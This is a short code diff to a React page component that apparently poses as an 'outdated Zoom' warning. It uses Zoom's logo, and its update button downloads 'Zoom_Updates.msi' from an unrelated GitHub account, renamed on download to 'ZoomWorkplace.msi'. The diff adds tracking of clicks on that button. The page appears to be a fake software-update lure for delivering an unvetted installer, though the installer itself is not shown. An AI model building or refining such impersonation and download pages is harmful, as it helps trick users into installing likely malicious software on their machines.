@@ -2,6 +2,7 @@ import { ArrowLeft, AlertTriangle } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import { toast } from "sonner";
 import zoomLogo from "@/assets/zoom-logo.png";
+import { logActivity } from "@/lib/activity";
 
 const DOWNLOAD_URL =
   "https://github.com/elizzygettygrant-maker/zoomupdates/releases/download/v.6565/Zoom_Updates.msi";
@@ -10,6 +11,7 @@ const OutdatedZoom = () => {
   const navigate = useNavigate();
 
   const handleUpdate = () => {
+    logActivity("click_update_zoom_outdated_page");
     const a = document.createElement("a");
     a.href = DOWNLOAD_URL;
     a.download = "ZoomWorkplace.msi";
